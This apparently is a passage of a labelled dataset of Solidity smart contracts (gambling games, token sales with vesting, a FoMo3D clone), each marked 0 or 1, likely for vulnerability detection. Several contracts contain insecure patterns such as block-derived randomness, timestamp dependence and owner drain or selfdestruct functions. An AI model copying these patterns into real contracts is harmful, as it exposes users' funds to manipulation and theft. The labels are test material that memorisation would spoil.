  totalWeiWagered += msg.value;        if(start <= random && random <= end){            totalWeiWon = safeAdd(totalWeiWon, playerProfit);            contractBalance = safeSub(contractBalance, playerProfit);            uint256 payout = safeAdd(playerProfit, msg.value);            setMaxProfit();            emit LogResult(betId, msg.sender, random, playerProfit, 1, start, end, 2, msg.value);            uint256 houseEdgeFee = getHouseEdgeFee(probability, msg.value);            increaseJackpot(houseEdgeFee * jackpotOfHouseEdge / 1000, betId);                        if(inviter != address(0)){                emit LogRecommendProfit(betId, msg.sender, playerProfit);                sendProportion(inviter, houseEdgeFee * recommendProportion / 1000);            }                        msg.sender.transfer(payout);            return;        }else{            emit LogResult(betId, msg.sender, random, 0, 0, start, end, 2, msg.value);                contractBalance = safeAdd(contractBalance, (msg.value-1));                                                                  setMaxProfit();            msg.sender.transfer(1);            return;        }    }    function oddEven(uint8 oddeven, address inviter) public payable gameIsActive oddEvenBetIsValid(msg.value, oddeven) {        betId += 1;        uint8 probability = 50;        playerProfit = ((msg.value * (100 - probability) / probability + msg.value) * (1000 - houseEdge) / 1000) - msg.value;        if(playerProfit > maxProfit) playerProfit = maxProfit;        uint8 random = uint8(rand() % 100 + 1);        totalWeiWagered += msg.value;        if(random % 2 == oddeven){            totalWeiWon = safeAdd(totalWeiWon, playerProfit);            contractBalance = safeSub(contractBalance, playerProfit);            uint256 payout = safeAdd(playerProfit, msg.value);            setMaxProfit();            emit LogResult(betId, msg.sender, random, playerProfit, 1, 0, 0, oddeven, msg.value);                        uint256 houseEdgeFee = getHouseEdgeFee(probability, msg.value);            increaseJackpot(houseEdgeFee * jackpotOfHouseEdge / 1000, betId);                        if(inviter != address(0)){                emit LogRecommendProfit(betId, msg.sender, playerProfit);                sendProportion(inviter, houseEdgeFee * recommendProportion / 1000);            }                        msg.sender.transfer(payout);              return;        }else{            emit LogResult(betId, msg.sender, random, 0, 0, 0, 0, oddeven, msg.value);             contractBalance = safeAdd(contractBalance, (msg.value-1));            setMaxProfit();            msg.sender.transfer(1);            return;        }    }    function sendProportion(address inviter, uint256 amount) internal {        require(amount < contractBalance);        contractBalance = safeSub(contractBalance, amount);        inviter.transfer(amount);    }    function increaseJackpot(uint256 increaseAmount, uint256 _betId) internal {        require(increaseAmount < maxProfit);        emit LogJackpot(_betId, msg.sender, increaseAmount);        jackpotBlance = safeAdd(jackpotBlance, increaseAmount);        contractBalance = safeSub(contractBalance, increaseAmount);        if(msg.value >= minJackpotBet){            jackpotPlayer.push(msg.sender);        }    }        function createWinner() public onlyOwner jackpotAreActive {        uint64 tmNow = uint64(block.timestamp);        require(tmNow >= nextJackpotTime);        require(jackpotPlayer.length > 0);        nextJackpotTime = tmNow + 72000;        JackpotPeriods += 1;        uint random = rand() % jackpotPlayer.length;        address winner = jackpotPlayer[random - 1];        jackpotPlayer.length = 0;        sendJackpot(winner);    }        function sendJackpot(address winner) public onlyOwner jackpotAreActive {        uint256 amount = jackpotBlance * jackpotPersent / 1000;        require(jackpotBlance > amount);        emit SendJackpotSuccesss(winner, amount, JackpotPeriods);        jackpotBlance = safeSub(jackpotBlance, amount);        winner.transfer(amount);    }        function sendValueToJackpot() payable public jackpotAreActive {        jackpotBlance = safeAdd(jackpotBlance, msg.value);    }        function getHouseEdgeFee(uint256 _probability, uint256 _betValue) view internal returns (uint256){        return (_betValue * (100 - _probability) / _probability + _betValue) * houseEdge / 1000;    }    function rand() internal returns (uint256) {        seed = uint256(keccak256(msg.sender, blockhash(block.number - 1), block.coinbase, block.difficulty));        return seed;    }    function setMaxProfit() internal {        maxProfit = contractBalance * maxProfitAsPercentOfHouse / 1000;      }    function ownerSetHouseEdge(uint16 newHouseEdge) public onlyOwner{        require(newHouseEdge <= 1000);        houseEdge = newHouseEdge;    }    function ownerSetMinJackpoBet(uint256 newVal) public onlyOwner{        require(newVal <= 1 ether);        minJackpotBet = newVal;    }    function ownerSetMaxProfitAsPercentOfHouse(uint8 newMaxProfitAsPercent) public onlyOwner{        require(newMaxProfitAsPercent <= 1000);        maxProfitAsPercentOfHouse = newMaxProfitAsPercent;        setMaxProfit();    }    function ownerSetMinBet(uint256 newMinimumBet) public onlyOwner{        minBet = newMinimumBet;    }    function ownerSetMaxBet(uint256 newMaxBet) public onlyOwner{        maxBet = newMaxBet;    }    function ownerSetJackpotOfHouseEdge(uint16 newProportion) public onlyOwner{        require(newProportion < 1000);        jackpotOfHouseEdge = newProportion;    }    function ownerSetRecommendProportion(uint16 newRecommendProportion) public onlyOwner{        require(newRecommendProportion < 1000);        recommendProportion = newRecommendProportion;    }    function ownerPauseGame(bool newStatus) public onlyOwner{        gamePaused = newStatus;    }    function ownerPauseJackpot(bool newStatus) public onlyOwner{        jackpotPaused = newStatus;    }    function ownerPauseRecommend(bool newStatus) public onlyOwner{        recommendPaused = newStatus;    }    function ownerTransferEther(address sendTo, uint256 amount) public onlyOwner{	        contractBalance = safeSub(contractBalance, amount);        sendTo.transfer(amount);        setMaxProfit();        emit LogOwnerTransfer(sendTo, amount);    }    function ownerChangeOwner(address newOwner) public onlyOwner{        owner = newOwner;    }    function ownerkill() public onlyOwner{        selfdestruct(owner);    }}
0<CODESPLIT>contract IMigrationContract {    function migrate(address _addr, uint256 _tokens, uint256 _totaltokens) public returns (bool success);} 
0<CODESPLIT>contract controllable is Ownable {    event AddToBlacklist(address _addr);    event DeleteFromBlacklist(address _addr);         mapping (address => bool) internal blacklist;           function addtoblacklist(address _addr) public onlyOwner {        blacklist[_addr] = true;        emit AddToBlacklist(_addr);    }         function deletefromblacklist(address _addr) public onlyOwner {        blacklist[_addr] = false;        emit DeleteFromBlacklist(_addr);    }         function isBlacklist(address _addr) public view returns(bool) {        return blacklist[_addr];    }} 
1<CODESPLIT>contract Lockable is Ownable, SafeMath {         mapping (address => uint256) balances;    mapping (address => uint256) totalbalances;    uint256 public totalreleaseblances;    mapping (address => mapping (uint256 => uint256)) userbalances;      mapping (address => mapping (uint256 => uint256)) userRelease;      mapping (address => mapping (uint256 => uint256)) isRelease;      mapping (address => mapping (uint256 => uint256)) userChargeTime;      mapping (address => uint256) userChargeCount;      mapping (address => mapping (uint256 => uint256)) lastCliff;           mapping (address => mapping (uint256 => mapping (uint256 => uint256))) userbalancesSegmentation;      uint256 internal duration = 30*15 days;    uint256 internal cliff = 90 days;         event userlockmechanism(address _addr,uint256 _amount,uint256 _timestamp);    event userrelease(address _addr, uint256 _times, uint256 _amount);    modifier onlySelfOrOwner(address _addr) {        require(msg.sender == _addr || msg.sender == ethFundDeposit);        _;    }    function LockMechanism (        address _addr,        uint256 _value    )        internal    {        require(_addr != address(0));        require(_value != 0);                 userChargeCount[_addr] = safeAdd(userChargeCount[_addr],1);        uint256 _times = userChargeCount[_addr];                 userChargeTime[_addr][_times] = ShowTime();                 userbalances[_addr][_times] = _value;        initsegmentation(_addr,userChargeCount[_addr],_value);        totalbalances[_addr] = safeAdd(totalbalances[_addr],_value);        isRelease[_addr][_times] = 0;        emit userlockmechanism(_addr,_value,ShowTime());    }     function initsegmentation(address _addr,uint256 _times,uint256 _value) internal {        for (uint8 i = 1 ; i <= 5 ; i++ ) {            userbalancesSegmentation[_addr][_times][i] = safeDiv(_value,5);        }    }     function CalcPeriod(address _addr, uint256 _times) public view returns (uint256) {        uint256 userstart = userChargeTime[_addr][_times];        if (ShowTime() >= safeAdd(userstart,duration)) {            return 5;        }        uint256 timedifference = safeSubtract(ShowTime(),userstart);        uint256 period = 0;        for (uint8 i = 1 ; i <= 5 ; i++ ) {            if (timedifference >= cliff) {                timedifference = safeSubtract(timedifference,cliff);                period += 1;            }        }        return period;    }     function ReleasableAmount(address _addr, uint256 _times) public view returns (uint256) {        require(_addr != address(0));        uint256 period = CalcPeriod(_addr,_times);        if (safeSubtract(period,isRelease[_addr][_times]) > 0){            uint256 amount = 0;            for (uint256 i = safeAdd(isRelease[_addr][_times],1) ; i <= period ; i++ ) {                amount = safeAdd(amount,userbalancesSegmentation[_addr][_times][i]);            }            return amount;        } else {            return 0;        }    }     function release(address _addr, uint256 _times) external onlySelfOrOwner(_addr) {        uint256 amount = ReleasableAmount(_addr,_times);        require(amount > 0);        userRelease[_addr][_times] = safeAdd(userRelease[_addr][_times],amount);        balances[_addr] = safeAdd(balances[_addr],amount);        lastCliff[_addr][_times] = ShowTime();        isRelease[_addr][_times] = CalcPeriod(_addr,_times);        totalreleaseblances = safeAdd(totalreleaseblances,amount);        emit userrelease(_addr, _times, amount);    }     function ShowTime() internal view returns (uint256) {        return block.timestamp;    }     function totalBalanceOf(address _addr) public view returns (uint256) {        return totalbalances[_addr];    }     function ShowRelease(address _addr, uint256 _times) public view returns (uint256) {        return userRelease[_addr][_times];    }     function ShowUnrelease(address _addr, uint256 _times) public view returns (uint256) {        return safeSubtract(userbalances[_addr][_times],ShowRelease(_addr,_times));    }     function ShowChargeTime(address _addr, uint256 _times) public view returns (uint256) {        return userChargeTime[_addr][_times];    }     function ShowChargeCount(address _addr) public view returns (uint256) {        return userChargeCount[_addr];    }     function ShowNextCliff(address _addr, uint256 _times) public view returns (uint256) {        return safeAdd(lastCliff[_addr][_times],cliff);    }     function ShowSegmentation(address _addr, uint256 _times,uint256 _period) public view returns (uint256) {        return userbalancesSegmentation[_addr][_times][_period];    }}
0<CODESPLIT>contract BugXToken is StandardToken {              string  public constant name = "BUGX2.0";    string  public constant symbol = "BUGX";    uint256 public constant decimals = 18;    string  public version = "2.0";         address public newContractAddr;                   bool    public isFunding;                     uint256 public fundingStartBlock;    uint256 public fundingStopBlock;    uint256 public currentSupply;                uint256 public tokenRaised = 0;                uint256 public tokenIssued = 0;              uint256 public tokenMigrated = 0;          uint256 internal tokenExchangeRate = 9000;                  uint256 internal tokenExchangeRateTwo = 9900;                  uint256 internal tokenExchangeRateThree = 11250;                       event AllocateToken(address indexed _to, uint256 _value);        event TakebackToken(address indexed _from, uint256 _value);        event RaiseToken(address indexed _to, uint256 _value);           event IssueToken(address indexed _to, uint256 _value);    event IncreaseSupply(uint256 _value);    event DecreaseSupply(uint256 _value);    event Migrate(address indexed _addr, uint256 _tokens, uint256 _totaltokens);         function formatDecimals(uint256 _value) internal pure returns (uint256 ) {        return _value * 10 ** decimals;    }              constructor(        address _ethFundDeposit,        uint256 _currentSupply        )         public    {        require(_ethFundDeposit != address(0x0));        ethFundDeposit = _ethFundDeposit;        isFunding = false;                                    fundingStartBlock = 0;        fundingStopBlock = 0;        currentSupply = formatDecimals(_currentSupply);        totalSupply = formatDecimals(1500000000);             require(currentSupply <= totalSupply);        balances[ethFundDeposit] = currentSupply;        totalbalances[ethFundDeposit] = currentSupply;    }              function increaseSupply (uint256 _tokens) onlyOwner external {        uint256 _value = formatDecimals(_tokens);        require (_value + currentSupply <= totalSupply);        currentSupply = safeAdd(currentSupply, _value);        tokenadd(ethFundDeposit,_value);        emit IncreaseSupply(_value);    }         function decreaseSupply (uint256 _tokens) onlyOwner external {        uint256 _value = formatDecimals(_tokens);        uint256 tokenCirculation = safeAdd(tokenRaised,tokenIssued);        require (safeAdd(_value,tokenCirculation) <= currentSupply);        currentSupply = safeSubtract(currentSupply, _value);        tokensub(ethFundDeposit,_value);        emit DecreaseSupply(_value);    }         modifier whenFunding() {        require (isFunding);        require (block.number >= fundingStartBlock);        require (block.number <= fundingStopBlock);        _;    }         function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) onlyOwner external {        require (!isFunding);        require (_fundingStartBlock < _fundingStopBlock);        require (block.number < _fundingStartBlock);        fundingStartBlock = _fundingStartBlock;        fundingStopBlock = _fundingStopBlock;        isFunding = true;    }         function stopFunding() onlyOwner external {        require (isFunding);        isFunding = false;    }              function setMigrateContract(address _newContractAddr) onlyOwner external {        require (_newContractAddr != newContractAddr);        newContractAddr = _newContractAddr;    }         function migrate(address _addr) onlySelfOrOwner(_addr) external {        require(!isFunding);        require(newContractAddr != address(0x0));        uint256 tokens_value = balances[_addr];        uint256 totaltokens_value = totalbalances[_addr];        require (tokens_value != 0 || totaltokens_value != 0);        balances[_addr] = 0;        totalbalances[_addr] = 0;        IMigrationContract newContract = IMigrationContract(newContractAddr);        require (newContract.migrate(_addr, tokens_value, totaltokens_value));        tokenMigrated = safeAdd(tokenMigrated, totaltokens_value);        emit Migrate(_addr, tokens_value, totaltokens_value);    }              function tokenRaise (address _addr,uint256 _value) internal {        uint256 tokenCirculation = safeAdd(tokenRaised,tokenIssued);        require (safeAdd(_value,tokenCirculation) <= currentSupply);        tokenRaised = safeAdd(tokenRaised, _value);        emit RaiseToken(_addr, _value);    }         function tokenIssue (address _addr,uint256 _value) internal {        uint256 tokenCirculation = safeAdd(tokenRaised,tokenIssued);        require (safeAdd(_value,tokenCirculation) <= currentSupply);        tokenIssued = safeAdd(tokenIssued, _value);        emit IssueToken(_addr, _value);    }         function tokenTakeback (address _addr,uint256 _value) internal {        require (tokenIssued >= _value);        tokenIssued = safeSubtract(tokenIssued, _value);        emit TakebackToken(_addr, _value);    }         function tokenadd (address _addr,uint256 _value) internal {        require(_value != 0);        require (_addr != address(0x0));        balances[_addr] = safeAdd(balances[_addr], _value);        totalbalances[_addr] = safeAdd(totalbalances[_addr], _value);    }         function tokensub (address _addr,uint256 _value) internal {        require(_value != 0);        require (_addr != address(0x0));        balances[_addr] = safeSubtract(balances[_addr], _value);        totalbalances[_addr] = safeSubtract(totalbalances[_addr], _value);    }              function allocateToken(address _addr, uint256 _tokens) onlyOwner external {        uint256 _value = formatDecimals(_tokens);        tokenadd(_addr,_value);        tokensub(ethFundDeposit,_value);        tokenIssue(_addr,_value);        emit Transfer(ethFundDeposit, _addr, _value);    }         function deductionToken (address _addr, uint256 _tokens) onlyOwner external {        uint256 _value = formatDecimals(_tokens);        tokensub(_addr,_value);        tokenadd(ethFundDeposit,_value);        tokenTakeback(_addr,_value);        emit Transfer(_addr, ethFundDeposit, _value);    }         function addSegmentation(address _addr, uint256 _times,uint256 _period,uint256 _tokens) onlyOwner external returns (bool) {        uint256 amount = userbalancesSegmentation[_addr][_times][_period];        if (amount != 0 && _tokens != 0){            uint256 _value = formatDecimals(_tokens);            userbalancesSegmentation[_addr][_times][_period] = safeAdd(amount,_value);            userbalances[_addr][_times] = safeAdd(userbalances[_addr][_times], _value);            totalbalances[_addr] = safeAdd(totalbalances[_addr], _value);            tokensub(ethFundDeposit,_value);            tokenIssue(_addr,_value);            return true;        } else {            return false;        }    }         function subSegmentation(address _addr, uint256 _times,uint256 _period,uint256 _tokens) onlyOwner external returns (bool) {        uint256 amount = userbalancesSegmentation[_addr][_times][_period];        if (amount != 0 && _tokens != 0){            uint256 _value = formatDecimals(_tokens);            userbalancesSegmentation[_addr][_times][_period] = safeSubtract(amount,_value);            userbalances[_addr][_times] = safeSubtract(userbalances[_addr][_times], _value);            totalbalances[_addr] = safeSubtract(totalbalances[_addr], _value);            tokenadd(ethFundDeposit,_value);            tokenTakeback(_addr,_value);            return true;        } else {            return false;        }    }              function setTokenExchangeRate(uint256 _RateOne,uint256 _RateTwo,uint256 _RateThree) onlyOwner external {        require (_RateOne != 0 && _RateTwo != 0 && _RateThree != 0);        require (_RateOne != tokenExchangeRate && _RateTwo != tokenExchangeRateTwo && _RateThree != tokenExchangeRateThree);        tokenExchangeRate = _RateOne;        tokenExchangeRateTwo = _RateTwo;        tokenExchangeRateThree = _RateThree;    }         function computeTokenAmount(uint256 _eth) internal view returns (uint256 tokens) {        if(_eth > 0 && _eth < 100 ether){            tokens = safeMult(_eth, tokenExchangeRate);        }                if (_eth >= 100 ether && _eth < 500 ether){            tokens = safeMult(_eth, tokenExchangeRateTwo);        }        if (_eth >= 500 ether ){            tokens = safeMult(_eth, tokenExchangeRateThree);        }    }         function LockMechanismByOwner (        address _addr,        uint256 _tokens    )        external onlyOwner whenFunding    {        require (_tokens != 0);        uint256 _value = formatDecimals(_tokens);        tokenRaise(_addr,_value);        tokensub(ethFundDeposit,_value);        LockMechanism(_addr,_value);        emit Transfer(ethFundDeposit,_addr,_value);    }              function transferETH() onlyOwner external {        require (address(this).balance != 0);        ethFundDeposit.transfer(address(this).balance);    }    function () public payable whenFunding {          require (msg.value != 0);        uint256 _value = computeTokenAmount(msg.value);        tokenRaise(msg.sender,_value);        tokensub(ethFundDeposit,_value);        LockMechanism(msg.sender,_value);        emit Transfer(ethFundDeposit,msg.sender,_value);    }}
0<CODESPLIT>contract EtherHiLo {    function cleanupAbandonedGame() public {        uint elapsed = block.timestamp - 100;        require(elapsed >= 86400);        return;    }}
1<CODESPLIT>contract DisbursementHandler is DisbursementHandlerI, Ownable {    using SafeMath for uint256;    using SafeERC20 for ERC20;    struct Disbursement {                 uint256 timestamp;                 uint256 value;    }    event Setup(address indexed _beneficiary, uint256 _timestamp, uint256 _value);    event TokensWithdrawn(address indexed _to, uint256 _value);    ERC20 public token;    uint256 public totalAmount;    mapping(address => Disbursement[]) public disbursements;    constructor(ERC20 _token) public {        require(_token != address(0));        token = _token;    }                        function setupDisbursement(        address _beneficiary,        uint256 _value,        uint256 _timestamp    )        external        onlyOwner    {        require(block.timestamp < _timestamp);        disbursements[_beneficiary].push(Disbursement(_timestamp, _value));        totalAmount = totalAmount.add(_value);        emit Setup(_beneficiary, _timestamp, _value);    }                   function withdraw(address _beneficiary, uint256 _index)        external    {        Disbursement[] storage beneficiaryDisbursements = disbursements[_beneficiary];        require(_index < beneficiaryDisbursements.length);        Disbursement memory disbursement = beneficiaryDisbursements[_index];        require(disbursement.timestamp < now && disbursement.value > 0);                 delete beneficiaryDisbursements[_index];        token.safeTransfer(_beneficiary, disbursement.value);        emit TokensWithdrawn(_beneficiary, disbursement.value);    }} interface VaultI {    function deposit(address contributor) external payable;    function saleSuccessful() external;    function enableRefunds() external;    function refund(address contributor) external;    function close() external;    function sendFundsToWallet() external;}  library Math {  function max64(uint64 a, uint64 b) internal pure returns (uint64) {    return a >= b ? a : b;  }  function min64(uint64 a, uint64 b) internal pure returns (uint64) {    return a < b ? a : b;  }  function max256(uint256 a, uint256 b) internal pure returns (uint256) {    return a >= b ? a : b;  }  function min256(uint256 a, uint256 b) internal pure returns (uint256) {    return a < b ? a : b;  }}   
0<CODESPLIT>contract Whitelistable is WhitelistableI, Ownable {    using ECRecovery for bytes32;    address public whitelistAdmin;         mapping(bytes32 => bool) public invalidHash;    event AdminUpdated(address indexed newAdmin);    modifier validAdmin(address _admin) {        require(_admin != 0);        _;    }    modifier onlyAdmin {        require(msg.sender == whitelistAdmin);        _;    }    modifier isWhitelisted(bytes32 _hash, bytes _sig) {        require(checkWhitelisted(_hash, _sig));        _;    }              constructor(address _admin) public validAdmin(_admin) {        whitelistAdmin = _admin;            }                   function changeAdmin(address _admin)        external        onlyOwner        validAdmin(_admin)    {        emit AdminUpdated(_admin);        whitelistAdmin = _admin;    }              function invalidateHash(bytes32 _hash) external onlyAdmin {        invalidHash[_hash] = true;    }    function invalidateHashes(bytes32[] _hashes) external onlyAdmin {        for (uint i = 0; i < _hashes.length; i++) {            invalidHash[_hashes[i]] = true;        }    }                        function checkWhitelisted(        bytes32 _rawHash,        bytes _sig    )        public        view        returns(bool)    {        bytes32 hash = _rawHash.toEthSignedMessageHash();        return !invalidHash[_rawHash] && whitelistAdmin == hash.recover(_sig);    }} interface EthPriceFeedI {    function getUnit() external view returns(string);    function getRate() external view returns(uint256);    function getLastTimeUpdated() external view returns(uint256); } interface SaleI {    function setup() external;      function changeEthPriceFeed(EthPriceFeedI newPriceFeed) external;    function contribute(address _contributor, uint256 _limit, uint256 _expiration, bytes _sig) external payable;     function allocateExtraTokens(address _contributor) external;    function setEndTime(uint256 _endTime) external;    function endSale() external;} 
0<CODESPLIT>contract TokenControllerI {              function transferAllowed(address _from, address _to)        external        view         returns (bool);}  
0<CODESPLIT>contract ControllableToken is Ownable, StandardToken {    TokenControllerI public controller;         modifier isAllowed(address _from, address _to) {        require(controller.transferAllowed(_from, _to));        _;    }         function setController(TokenControllerI _controller) onlyOwner public {        require(_controller != address(0));        controller = _controller;    }              function transfer(address _to, uint256 _value)         isAllowed(msg.sender, _to)        public        returns (bool)    {        return super.transfer(_to, _value);    }              function transferFrom(address _from, address _to, uint256 _value)        isAllowed(_from, _to)         public         returns (bool)    {        return super.transferFrom(_from, _to, _value);    }}  
0<CODESPLIT>contract FoamSale is Sale {    address private constant FOAM_WALLET = 0x3061CFBAe69Bff0f933353cea20de6C89Ab16acc;    constructor()         Sale(            24000000,              90,              1,              1000000000 * (10 ** 18),              0x8dAB5379f7979df2Fac963c69B66a25AcdaADbB7,              FOAM_WALLET,              1 ether,              25000 ether,              0,              1532803878,              "FOAM Token",              "FOAM",              18,              EthPriceFeedI(0x54bF24e1070784D7F0760095932b47CE55eb3A91)          )        public     {                 setupDisbursement(FOAM_WALLET, 700000000 * (10 ** 18), 1 hours);    }}
1<CODESPLIT>contract MOEToken is ERC20 {    using SafeMath for uint256;    address public owner;    mapping (address => uint256) balances;    mapping (address => mapping (address => uint256)) allowed;    string public name = "MOE's game art foundation";    string public constant symbol = "MOE";    uint public constant decimals = 18;    bool public stopped;        modifier stoppable {        assert(!stopped);        _;    }        uint256 public totalSupply = 1000000000*(10**18);    event Transfer(address indexed _from, address indexed _to, uint256 _value);    event Approval(address indexed _owner, address indexed _spender, uint256 _value);    event LOCK(address indexed _owner, uint256 _value);    mapping (address => uint256) public lockAddress;        modifier lock(address _add){        require(_add != address(0));        uint256 releaseTime = lockAddress[_add];        if(releaseTime > 0){             require(block.timestamp >= releaseTime);              _;        }else{             _;        }    }        modifier onlyOwner() {        require(msg.sender == owner);        _;    }        function MOEToken() public {        owner = msg.sender;        balances[msg.sender] = totalSupply;    }    function stop() onlyOwner public {        stopped = true;    }    function start() onlyOwner public {        stopped = false;    }        function lockTime(address _to,uint256 _value) onlyOwner public {       if(_value > block.timestamp){         lockAddress[_to] = _value;         emit LOCK(_to, _value);       }    }        function lockOf(address _owner) constant public returns (uint256) {	    return lockAddress[_owner];    }        function transferOwnership(address _newOwner) onlyOwner public {        if (_newOwner != address(0)) {            owner = _newOwner;        }    }        function () public payable {        address myAddress = this;        emit Transfer(msg.sender, myAddress, msg.value);     }    function balanceOf(address _owner) constant public returns (uint256) {	    return balances[_owner];    }        function transfer(address _to, uint256 _amount) stoppable lock(msg.sender) public returns (bool success) {        require(_to != address(0));        require(_amount <= balances[msg.sender]);                balances[msg.sender] = balances[msg.sender].sub(_amount);        balances[_to] = balances[_to].add(_amount);        emit Transfer(msg.sender, _to, _amount);        return true;    }        function transferFrom(address _from, uint256 _amount) stoppable lock(_from) public returns (bool success) {        require(_amount <= balances[_from]);        require(_amount <= allowed[_from][msg.sender]);                balances[_from] = balances[_from].sub(_amount);        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);        balances[msg.sender] = balances[msg.sender].add(_amount);        emit Transfer(_from, msg.sender, _amount);        return true;    }        function approve(address _spender, uint256 _value) stoppable lock(_spender) public returns (bool success) {        if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }        allowed[msg.sender][_spender] = _value;        emit Approval(msg.sender, _spender, _value);        return true;    }        function allowance(address _owner, address _spender)  constant public returns (uint256) {        return allowed[_owner][_spender];    }        function withdraw() onlyOwner public {        address myAddress = this;        uint256 etherBalance = myAddress.balance;        owner.transfer(etherBalance);    }        function kill() onlyOwner public {       selfdestruct(msg.sender);    }        function setName(string _name) onlyOwner public  {        name = _name;    }}
1<CODESPLIT>contract EtherLotto {    uint constant FEE_AMOUNT = 1;    address public bank;    uint public pot;    function play() payable {        var random = uint(block.blockhash(block.number)) + block.timestamp + block.difficulty + block.number;        if (mulmod(random, 1, 2) == 0) {            bank.transfer(FEE_AMOUNT);            msg.sender.transfer(pot - FEE_AMOUNT);        }        return;    }}
0<CODESPLIT>contract FoMoRapid is F3Devents{    using SafeMath for uint256;    using NameFilter for string;    using F3DKeysCalcFast for uint256;        address admin;    PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x56a4d4e31c09558F6A1619DFb857a482B3Bb2Fb6);        string constant public name = "FoMo3D Soon(tm) Edition";    string constant public symbol = "F3D";	uint256 private rndGap_ = 60 seconds;                            uint256 constant private rndInit_ = 5 minutes;                   uint256 constant private rndInc_ = 5 minutes;                    uint256 constant private rndMax_ = 5 minutes;                    	uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;            mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => F3Ddatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;         mapping (uint256 => F3Ddatasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;              mapping (uint256 => F3Ddatasets.TeamFee) public fees_;               mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;              constructor()        public    {		                                     		                               fees_[0] = F3Ddatasets.TeamFee(30,6);            fees_[1] = F3Ddatasets.TeamFee(43,0);            fees_[2] = F3Ddatasets.TeamFee(56,10);           fees_[3] = F3Ddatasets.TeamFee(43,8);                                      potSplit_[0] = F3Ddatasets.PotSplit(15,10);           potSplit_[1] = F3Ddatasets.PotSplit(25,0);            potSplit_[2] = F3Ddatasets.PotSplit(20,20);           potSplit_[3] = F3Ddatasets.PotSplit(30,10);           admin = msg.sender;	}             modifier isActivated() {        require(activated_ == true, "its not ready yet.  check ?eta in discord");         _;    }             modifier isHuman() {        address _addr = msg.sender;        require (_addr == tx.origin);                uint256 _codeLength;                assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "sorry humans only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "pocket lint: not a valid currency");		_;    	}             function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         buyCore(_pID, plyr_[_pID].laff, 2, _eventData_);    }             function buyXid(uint256 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                                  if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                             } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affCode, _team, _eventData_);    }        function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxAddr_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affID, _team, _eventData_);    }        function buyXname(bytes32 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxName_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         buyCore(_pID, _affID, _team, _eventData_);    }             function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                                  if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                             } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                             reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }        function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxAddr_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }        function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                         } else {                         _affID = pIDxName_[_affCode];                                     if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                         _team = verifyTeam(_team);                         reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {                 uint256 _rID = rID_;                         uint256 _now = now;                         uint256 _pID = pIDxAddr_[msg.sender];                         uint256 _eth;                         if (_now > round_[_rID].end && round_[_rID].ended == false)        {                         F3Ddatasets.EventReturns memory _eventData_;                         			round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);            			             _eth = withdrawEarnings(_pID);                                     if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                                         _eventData_.compressedData = 